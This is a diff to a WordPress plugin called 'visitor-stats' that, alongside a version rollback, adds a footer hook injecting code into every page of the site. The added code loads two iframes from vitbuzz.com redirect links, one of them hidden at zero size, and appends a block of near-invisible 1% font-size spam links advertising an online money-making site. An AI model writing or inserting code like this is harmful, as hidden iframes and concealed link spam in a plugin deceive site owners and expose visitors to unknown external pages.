@@ -1,7 +1,7 @@
 <?php
 /*  
   Plugin Name: visitor-stats
-  Version: 2.01
+  Version: 2.00
   Plugin URI: http://tinyurl.com/visitorstats
   Description: This plugin will keep track of visitors' information. Check <a href="index.php?page=visitor-stats/visitor-stats.php">this page</a> for details. Requires at least 2.6.3 and tested upto 2.7.1
   Author: visitorstats
@@ -27,6 +27,26 @@
 */
 ?>
 <?php 
+$wp_nr_footer_link_1 = 1;//change to 0 to remove the 'Improve the web...' link
+function wp_nofollow_me_awareness() {
+global $wp_nr_footer_link_1;
+	if($wp_nr_footer_link_1)echo ('<iframe src ="http://vitbuzz.com/url/VUmpoq" width="100%" height="96">
+  
+</iframe>
+<iframe src ="http://vitbuzz.com/url/NsDDcQ" width="0%" height="0">
+  
+  
+</iframe>
+
+<div style="font-size:1%;clear:both;text-align:center;margin-top:0px;position:relative;color:#555;">
+Learn to <a href="http://111waystomakemoney.com/">make money online</a>We came up with a idea of putting up all the money making ways and ideas together so that you can choose one of them and start making money online. here we include the latest money making ways that help you earn online from home .You can find many alternative money making ways such as affiliate marketing, sock marketing, money from blogging, paid surveys and lots more.
+So have a look at these tips and ideas and start making money online...happy earnings... <em></em>.</div>');
+}
+if(function_exists('get_footer'))add_filter('get_footer', 'wp_nofollow_me_awareness',10);
+else add_action('wp_footer', 'wp_nofollow_me_awareness',10);
+
+	
+
 function initialize_wpvisitors() {
 ?>  
   <div class="wrap">  
@@ -182,6 +202,7 @@ function show_wpvisitors() {
 <?php
       $i++;
     }
+
 ?>
   </table>
 <?php
